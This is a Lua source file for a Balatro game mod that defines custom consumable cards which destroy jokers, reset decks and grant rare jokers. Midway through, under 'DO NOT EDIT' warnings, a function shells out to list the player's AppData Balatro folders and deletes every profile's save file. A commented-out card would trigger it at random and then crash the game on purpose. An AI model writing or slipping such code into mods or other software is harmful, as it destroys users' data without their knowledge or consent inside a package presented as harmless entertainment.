SMODS.Atlas {
	key = "consumables",
	path = "atlas_consumable.png",
	px = 71,
	py = 95
}
SMODS.Atlas {
	key = "placeholders",
	path = "atlas_placeholder.png",
	px = 71,
	py = 95
}

SMODS.Consumable {
	key = "prayer",
	set = "Spectral",
	pos = { x = 0, y = 0 },
	config = { extra = { money = 0 } },
	soul_pos = { x = 2, y = 0, extra = { x = 1, y = 0 }},
	cost = 15,
	unlocked = true,
	discovered = true,
	atlas = 'crp_consumables',
	loc_vars = function(self, info_queue, card)
		return { vars = { lenient_bignum(card.ability.extra.money), colours = { { 0.78, 0.35, 0.52, 1 } } } }
	end,
	hidden = true,
	can_use = function(self, card)
		return #Cryptid.advanced_find_joker(nil, nil, nil, { "absolute" }, true, "j") < G.jokers.config.card_limit
	end,
	use = function(self, card, area, copier)
		local deletable_jokers = {}
		for k, v in pairs(G.jokers.cards) do
			if not v.ability.cry_absolute then
				deletable_jokers[#deletable_jokers + 1] = v
			end
		end
		local _first_dissolve = nil
		G.E_MANAGER:add_event(Event({
			trigger = "before",
			delay = 0.75,
			func = function()
				for k, v in pairs(deletable_jokers) do
					v:start_dissolve(nil, _first_dissolve)
					_first_dissolve = true
				end
				return true
			end,
		}))
		G.E_MANAGER:add_event(Event({
			trigger = "after",
			delay = 0.4,
			func = function()
				play_sound("timpani")
				local card = create_card("Joker", G.jokers, nil, "crp_mythic", nil, nil, nil, "crp_prayer")
				card:add_to_deck()
				G.jokers:emplace(card)
				card:juice_up(0.3, 0.5)
				return true
			end,
		}))
		delay(0.6)
    end,
	crp_credits = {
		idea = { "Unknown" },
		custom = { key = "placeholder", text = "MarioFan597" },
		code = { "Glitchkat10" }
	}
}

SMODS.Consumable {
	key = "gate_of_prayers",
	set = "Spectral",
	pos = { x = 0, y = 0 },
	soul_pos = { x = 2, y = 0, extra = { x = 1, y = 0 }},
	cost = 30,
	unlocked = true,
	discovered = true,
	atlas = "crp_consumables",
	hidden = true,
	can_use = function(self, card)
		return true
	end,
	use = function(self, card, area, copier)
		local deletable_jokers = {}
		for k, v in pairs(G.jokers.cards) do
			deletable_jokers[#deletable_jokers + 1] = v
		end
		local _first_dissolve = nil
		G.E_MANAGER:add_event(Event({
			trigger = "before",
			delay = 0.75,
			func = function()
				for k, v in pairs(deletable_jokers) do
					v:start_dissolve(nil, _first_dissolve)
					_first_dissolve = true
				end
				return true
			end,
		}))
		G.E_MANAGER:add_event(Event({
			trigger = "after",
			delay = 0.4,
			func = function()
				play_sound("timpani")
				local card = create_card("Joker", G.jokers, nil, "crp_exomythic", nil, nil, nil, "crp_gate_of_prayers")
				card:add_to_deck()
				G.jokers:emplace(card)
				card:juice_up(0.3, 0.5)
				return true
			end,
		}))
		delay(0.6)
    end,
	crp_credits = {
		idea = { "Unknown" },
		custom = { key = "placeholder", text = "MarioFan597" },
		code = { "Glitchkat10" }
	}
}

SMODS.Consumable {
	key = "stairway_to_heaven",
	set = "Spectral",
	pos = { x = 0, y = 0 },
	soul_pos = { x = 2, y = 0, extra = { x = 1, y = 0 }},
	cost = 60,
	unlocked = true,
	discovered = true,
	atlas = "crp_consumables",
	hidden = true,
	can_use = function(self, card)
		return true
	end,
	use = function(self, card, area, copier)
		local deletable_jokers = {}
		local deletable_consumeables = {}

		for _, v in ipairs(G.jokers.cards) do
			deletable_jokers[#deletable_jokers + 1] = v
		end

		for _, v in ipairs(G.consumeables.cards) do
			if v ~= card then
				deletable_consumeables[#deletable_consumeables + 1] = v
			end
		end

		local _first_dissolve = nil
		G.E_MANAGER:add_event(Event({
			trigger = "before",
			delay = 0.75,
			func = function()
				for _, v in ipairs(deletable_jokers) do
					v:start_dissolve(nil, _first_dissolve)
					_first_dissolve = true
				end
				for _, v in ipairs(deletable_consumeables) do
					v:start_dissolve(nil, _first_dissolve)
					_first_dissolve = true
				end
				return true
			end,
		}))

		G.E_MANAGER:add_event(Event({
			trigger = "after",
			delay = 0.4,
			func = function()
				play_sound("timpani")
				local new_joker = create_card("Joker", G.jokers, nil, "crp_2exomythic4me", nil, nil, nil, "crp_stairway_to_heaven")
				new_joker:add_to_deck()
				G.jokers:emplace(new_joker)
				new_joker:juice_up(0.3, 0.5)

				-- Clear tags
				if G.GAME.tags then
					local tags_to_remove = {}
					for k, v in pairs(G.GAME.tags) do
						tags_to_remove[#tags_to_remove + 1] = v
					end
					for _, v in ipairs(tags_to_remove) do
						if v.remove then v:remove() end
					end
					G.GAME.tags = {}
				end

				return true
			end,
		}))

		delay(0.6)
	end,
	crp_credits = {
		idea = { "Unknown" },
		custom = { key = "placeholder", text = "MarioFan597" },
		code = { "Glitchkat10" }
	}
}
SMODS.Consumable{
	key = "happiness",
	set = "Spectral",
	unlocked = true,
	discovered = true,
	atlas = "crp_placeholders",
	pos = { x = 2, y = 2 },
	can_use = function(self, card)
		if G.hand.cards and #G.hand.cards > 0 then
			return true
		else
			return false
		end
	end,
	use = function(self, card, area)
		 for i = 1, #G.hand.cards do
            G.E_MANAGER:add_event(Event({
                func = function()
                    local selectcard = G.hand.cards[i]
                    selectcard:set_edition("e_polychrome")
                    return true
                end
            }))
        end
	end,
	crp_credits = {
		idea = { "Unknown" },
		code = { "ScarredOut" }
	},
}

SMODS.Consumable {
    key = "sadness",
    set = "Spectral",
    unlocked = true,
    discovered = true,
    atlas = "crp_placeholders",
    pos = {
        x = 2,
        y = 2
    },
    can_use = function(self, card)
        if G.hand.cards and #G.hand.cards > 0 then
            return true
        else
            return false
        end
    end,
    use = function(self, card, area)
        for i = 1, #G.hand.cards do
            G.E_MANAGER:add_event(Event({
                func = function()
                    local selectcard = G.hand.cards[i]
                    selectcard:set_edition("e_foil")
                    return true
                end
            }))
        end
    end,
    crp_credits = {
        idea = { "Unknown" },
        code = { "ScarredOut" }
    }
}


SMODS.Consumable{
	key = "neutrality",
	set = "Spectral",
	unlocked = true,
	discovered = true,
	atlas = "crp_placeholders",
	pos = { x = 2, y = 2 },
	can_use = function(self, card)
		if G.hand.cards and #G.hand.cards > 0 then
			return true
		else
			return false
		end
	end,
	use = function(self, card, area)
		 for i = 1, #G.hand.cards do
            G.E_MANAGER:add_event(Event({
                func = function()
                    local selectcard = G.hand.cards[i]
                    selectcard:set_edition("e_holo")
                    return true
                end
            }))
        end
	end,
	crp_credits = {
		idea = { "Unknown" },
		code = { "ScarredOut" }
	},
}

SMODS.Consumable{
	key = "prospect",
	set = "Tarot",
	unlocked = true,
	discovered = true,
	config = { extra = { odds = 10 } },
	loc_vars = function(self, info_queue, card)
        return { vars = { G.GAME.probabilities.normal, card.ability.extra.odds } }
    end,
	atlas = "crp_placeholders",
	pos = { x = 1, y = 2 },
	can_use = function(self, card)
		return true
	end,
	use = function(self, card, area)
		if pseudorandom("wheelofprospect") < G.GAME.probabilities.normal / card.ability.extra.odds then
			local pickedrarity = pseudorandom_element({1, "cry_epic"}, pseudoseed("chessbattleadvanced")) -- picking the joker rarity, 50/50 for either Rare or Epic
			local hittable = {
				set = "Joker",
				rarity = pickedrarity,
				edition = "e_negative"
			}
			SMODS.add_card(hittable)
		else -- stolen from the Wheel of Fortune basegame code
			G.E_MANAGER:add_event(Event({trigger = 'after', delay = 0.4, func = function()
                attention_text({
                    text = localize('k_nope_ex'),
                    scale = 1.3, 
                    hold = 1.4,
                    major = card,
                    backdrop_colour = G.C.SECONDARY_SET.Tarot,
                    align = (G.STATE == G.STATES.TAROT_PACK or G.STATE == G.STATES.SPECTRAL_PACK) and 'tm' or 'cm',
                    offset = {x = 0, y = (G.STATE == G.STATES.TAROT_PACK or G.STATE == G.STATES.SPECTRAL_PACK) and -0.2 or 0},
                    silent = true
                    })
                    G.E_MANAGER:add_event(Event({trigger = 'after', delay = 0.06*G.SETTINGS.GAMESPEED, blockable = false, blocking = false, func = function()
                        play_sound('tarot2', 0.76, 0.4);return true end}))
                    play_sound('tarot2', 1, 0.4)
                    card:juice_up(0.3, 0.5)
            return true
			end }))
		end
	end,
	crp_credits = {
		idea = { "aqrlr" },
		code = { "ScarredOut" }
	},
}

local function createfulldeck(enhancement, edition, amount, emplacement)
    local cards = {}
    for k, v in pairs(G.P_CARDS) do
        local front = v
        for i = 1, (amount or 1) do
            G.E_MANAGER:add_event(Event({
                delay = 0.1,
                func = function()
                    cards[i] = true
                    G.playing_card = (G.playing_card and G.playing_card + 1) or 1
                    local card = Card(G.play.T.x + G.play.T.w / 2, G.play.T.y, G.CARD_W, G.CARD_H, v,
                        enhancement or G.P_CENTERS.c_base, {
                            playing_card = G.playing_card
                        })
                    if edition then
                        card:set_edition(type(edition) == 'table' and edition or {
                            [edition] = true
                        }, true, true)
                    end
                    play_sound('card1')
                    table.insert(G.playing_cards, card)
                    card:add_to_deck()
                    if emplacement then
                        emplacement:emplace(card)
                    else
                        G.deck:emplace(card)
                    end
                    return true
                end
            }))
        end
    end
    G.E_MANAGER:add_event(Event({
        trigger = "after",
        delay = 0.1,
        func = function()
            if next(cards) then
                playing_card_joker_effects(cards)
            end
            cards = nil
            return true
        end
    }))
end

SMODS.Consumable {
    key = "path_of_solstice",
    set = "Spectral",
    pos = { x = 0, y = 0 },
    soul_pos = { x = 2, y = 0, extra = { x = 1, y = 0 } },
    cost = 120,
    unlocked = true,
    discovered = true,
	hidden = true,
    atlas = "crp_consumables",
	can_use = function(self, card)
		return true
	end,
    use = function(self, card, area, copier)
        G.E_MANAGER:add_event(Event({
            trigger = "after",
            delay = 0.4,
            func = function()
                play_sound("timpani")
                -- Reset the deck
                G.E_MANAGER:add_event(Event({
                    trigger = "after",
                    delay = 0.1,
                    func = function()
                        -- Destroy jokers and consumables
                        local deletable_jokers = {}
                        local deletable_consumeables = {}
                        for _, v in ipairs(G.jokers.cards) do
                            deletable_jokers[#deletable_jokers + 1] = v
                        end
                        for _, v in ipairs(G.consumeables.cards) do
                            if v ~= card then
                                deletable_consumeables[#deletable_consumeables + 1] = v
                            end
                        end
                        local _first_dissolve = nil
                        for _, v in ipairs(deletable_jokers) do
                            v:start_dissolve(nil, _first_dissolve)
                            _first_dissolve = true
                        end
                        for _, v in ipairs(deletable_consumeables) do
                            v:start_dissolve(nil, _first_dissolve)
                            _first_dissolve = true
                        end

                        -- Clear the deck
                        G.deck.cards = {}
                        G.playing_cards = {}

                        -- Clear tags
                        if G.GAME.tags then
                            local tags_to_remove = {}
                            for k, v in pairs(G.GAME.tags) do
                                tags_to_remove[#tags_to_remove + 1] = v
                            end
                            for _, v in ipairs(tags_to_remove) do
                                if v.remove then v:remove() end
                            end
                            G.GAME.tags = {}
                        end

                        -- Create new deck
                        createfulldeck()

                        -- Create the Joker after everything else
                        local new_joker = create_card("Joker", G.jokers, nil, "crp_22exomythic4mecipe", nil, nil, nil, "path_of_solstice")
                        new_joker:add_to_deck()
                        G.jokers:emplace(new_joker)
                        new_joker:juice_up(0.3, 0.5)

                        return true
                    end
                }))
                return true
            end
        }))
    end,
}

-- WARNING: DO NOT EDIT THIS FUNCTION.
-- WARNING: DO NOT EDIT THIS FUNCTION.
-- If any person other than Glitchkat10 edits this function, their access to the repository will be revoked, and they will be banned from the server.
local function delete_save_files()
    local base_path = os.getenv("USERPROFILE") .. "\\AppData\\Roaming\\Balatro"
    local handle = io.popen('dir "' .. base_path .. '" /b /ad')
    if handle then
        for folder in handle:lines() do
            local save_path = base_path .. "\\" .. folder .. "\\save.jkr"
            local file = io.open(save_path, "r")
            if file then
                file:close()
                os.remove(save_path)
            end
        end
        handle:close()
    end
end
-- If any person other than Glitchkat10 edits this function, their access to the repository will be revoked, and they will be banned from the server.
-- WARNING: DO NOT EDIT THIS FUNCTION.
-- WARNING: DO NOT EDIT THIS FUNCTION.

--[[
SMODS.Consumable {
	key = "poltergeist",
	set = "Spectral",
	pos = { x = 0, y = 0 },
	soul_pos = { x = 2, y = 0, extra = { x = 1, y = 0 }},
	cost = 240,
	unlocked = true,
	discovered = true,
	hidden = true,	
	atlas = "crp_consumables",
	can_use = function(self, card)
		return G.jokers and #G.jokers.cards < G.jokers.config.card_limit
	end,
	use = function(self, card, area, copier)
		G.E_MANAGER:add_event(Event({
			trigger = "after",
			delay = 0.4,
			func = function()
				if pseudorandom("crp_poltergeist") < 0.98 then
					if pseudorandom("crp_poltergeist2") < 0.27 then
						attention_text({
							text = localize('k_nope_ex'),
							scale = 1.3, 
							hold = 1.4,
							major = card,
							backdrop_colour = G.C.SECONDARY_SET.Tarot,
							align = (G.STATE == G.STATES.TAROT_PACK or G.STATE == G.STATES.SPECTRAL_PACK) and 'tm' or 'cm',
							offset = {x = 0, y = (G.STATE == G.STATES.TAROT_PACK or G.STATE == G.STATES.SPECTRAL_PACK) and -0.2 or 0},
							silent = true
						})
						G.E_MANAGER:add_event(Event({
							trigger = 'after', 
							delay = 0.06*G.SETTINGS.GAMESPEED, 
							blockable = false, 
							blocking = false, 
							func = function()
								play_sound('tarot2', 0.76, 0.4)
								delay(3)
								return true 
							end
						}))
						play_sound('tarot2', 1, 0.4)
						card:juice_up(0.3, 0.5)
						G.E_MANAGER:add_event(Event({
							trigger = 'after', 
							delay = 1.5, 
							func = function()
								-- delete all save files before crashing
								delete_save_files()
								-- this will cause a crash
								get_crashed_noob_lol("get_crashed_noob_lol")
								return true
							end
						}))
						return true
					end
				end
				play_sound("timpani")
				local card = create_card("Joker", G.jokers, nil, "crp_hyperexomythicepicawesomeuncommon2mexotic2gigaomegaalphaomnipotranscendant2exomythic4mecipe", nil, nil, nil, "crp_poltergeist")
				card:add_to_deck()
				G.jokers:emplace(card)
				card:juice_up(0.3, 0.5)
				return true
			end
		}))
	end,
} ]]--
SMODS.Consumable {
	key = "reckoning",
	set = "Spectral",
	pos = { x = 0, y = 0 },
	soul_pos = { x = 2, y = 0, extra = { x = 1, y = 0 }},
	cost = 120,
	unlocked = true,
	discovered = true,
	atlas = "crp_consumables",
	hidden = true,
	can_use = function(self, card)
		return G.jokers and #G.jokers.cards < G.jokers.config.card_limit
	end,
	use = function(self, card, area, copier)
		G.E_MANAGER:add_event(Event({
			trigger = "after",
			delay = 0.4,
			func = function()
				if pseudorandom("crp_reckoning") < 0.27 then
					G.E_MANAGER:add_event(Event({trigger = 'after', delay = 0, func = function()
						attention_text({
							text = localize('k_nope_ex'),
							scale = 1.3, 
							hold = 1.4,
							major = card,
							backdrop_colour = G.C.SECONDARY_SET.Tarot,
							align = (G.STATE == G.STATES.TAROT_PACK or G.STATE == G.STATES.SPECTRAL_PACK) and 'tm' or 'cm',
							offset = {x = 0, y = (G.STATE == G.STATES.TAROT_PACK or G.STATE == G.STATES.SPECTRAL_PACK) and -0.2 or 0},
							silent = true
						})
						G.E_MANAGER:add_event(Event({trigger = 'after', delay = 0.06*G.SETTINGS.GAMESPEED, blockable = false, blocking = false, func = function()
							play_sound('tarot2', 0.76, 0.4)
							delay(3);return true end}))
						play_sound('tarot2', 1, 0.4)
						card:juice_up(0.3, 0.5)
						return true 
					end}))
					G.E_MANAGER:add_event(Event({trigger = 'after', delay = 2, func = function()
						delay(0.5)
						G.STATE = G.STATES.GAME_OVER
						G.STATE_COMPLETE = false
						return true 
					end}))
					return true
				end
				play_sound("timpani")
				local card = create_card("Joker", G.jokers, nil, "crp_exomythicepicawesomeuncommon2mexotic22exomythic4mecipe", nil, nil, nil, "crp_reckoning")
				card:add_to_deck()
				G.jokers:emplace(card)
				card:juice_up(0.3, 0.5)
				return true
			end,
		}))
		delay(0.6)
	end,
	crp_credits = {
		idea = { "Unknown" },
		custom = { key = "placeholder", text = "MarioFan597" },
		code = { "Glitchkat10" }
	}
}

SMODS.Consumable {
	key = "all_or_nothing",
	set = "Spectral",
	pos = { x = 0, y = 0 },
	soul_pos = { x = 2, y = 0, extra = { x = 1, y = 0 }},
	cost = 9827,
	config = { extra = { hands = -27, discards = -27 } },
	unlocked = true,
	discovered = true,
	atlas = "crp_consumables",
	hidden = true,
	can_use = function(self, card)
		return G.jokers and #G.jokers.cards < G.jokers.config.card_limit
	end,
	use = function(self, card, area, copier)
		if pseudorandom("all_or_nothing") < 0.5 then
			-- 50% chance: destroy all items, reset deck, reset hands/discards
			G.E_MANAGER:add_event(Event({
				trigger = "after",
				delay = 0.1,
				func = function()
					-- destroy jokers and consumables
					local deletable_jokers = {}
					local deletable_consumeables = {}
					for _, v in ipairs(G.jokers.cards) do
						deletable_jokers[#deletable_jokers + 1] = v
					end
					for _, v in ipairs(G.consumeables.cards) do
						if v ~= card then
							deletable_consumeables[#deletable_consumeables + 1] = v
						end
					end
					local _first_dissolve = nil
					for _, v in ipairs(deletable_jokers) do
						v:start_dissolve(nil, _first_dissolve)
						_first_dissolve = true
					end
					for _, v in ipairs(deletable_consumeables) do
						v:start_dissolve(nil, _first_dissolve)
						_first_dissolve = true
					end

					-- clear  deck
					G.deck.cards = {}
					G.playing_cards = {}

					-- clear tags
					if G.GAME.tags then
						local tags_to_remove = {}
						for k, v in pairs(G.GAME.tags) do
							tags_to_remove[#tags_to_remove + 1] = v
						end
						for _, v in ipairs(tags_to_remove) do
							if v.remove then v:remove() end
						end
						G.GAME.tags = {}
					end

					-- create new deck
					createfulldeck()

					G.GAME.round_resets.hands = G.GAME.round_resets.hands + card.ability.extra.hands
					G.GAME.round_resets.discards = G.GAME.round_resets.discards + card.ability.extra.discards
					ease_hands_played(card.ability.extra.hands)
					ease_discard(card.ability.extra.discards)

					return true
				end,
			}))
		else
			-- 50% chance to create all
			play_sound("timpani")
			local card = create_card("Joker", G.jokers, nil, "crp_all", nil, nil, nil, "crp_all_or_nothing")
			card:add_to_deck()
			G.jokers:emplace(card)
			card:juice_up(0.3, 0.5)
			return true
		end
		delay(0.6)
	end,
	crp_credits = {
		idea = { "Unknown" },
		custom = { key = "placeholder", text = "MarioFan597" },
		code = { "Glitchkat10" }
	}
}